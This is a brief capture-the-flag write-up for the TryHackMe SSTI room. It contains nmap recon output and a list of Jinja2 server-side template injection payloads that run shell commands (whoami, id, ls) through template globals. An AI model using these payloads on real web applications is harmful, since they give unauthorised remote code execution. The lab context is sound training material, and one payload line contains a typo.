Writeup for room [SSTI](https://tryhackme.com/r/room/learnssti)

## Recon
```
nmap -A -Pn $ip
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:36:ba:cc:38:7c:a3:72:74:0b:d0:ff:d6:22:c3:de (RSA)
|   256 ac:27:df:7b:bd:bd:db:27:72:8c:4d:3e:fe:37:ac:7c (ECDSA)
|_  256 bd:87:c7:fa:c7:0f:a4:fe:a6:0e:ad:58:ee:0e:31:10 (ED25519)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![image](https://github.com/user-attachments/assets/5f5d5e3b-849c-4ee7-bf88-e3049b33659d)

Exploit
```
{{ ''.__class__ }}
{ ''.__class__ }}
{% import os %}{{ os.system("whoami") }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
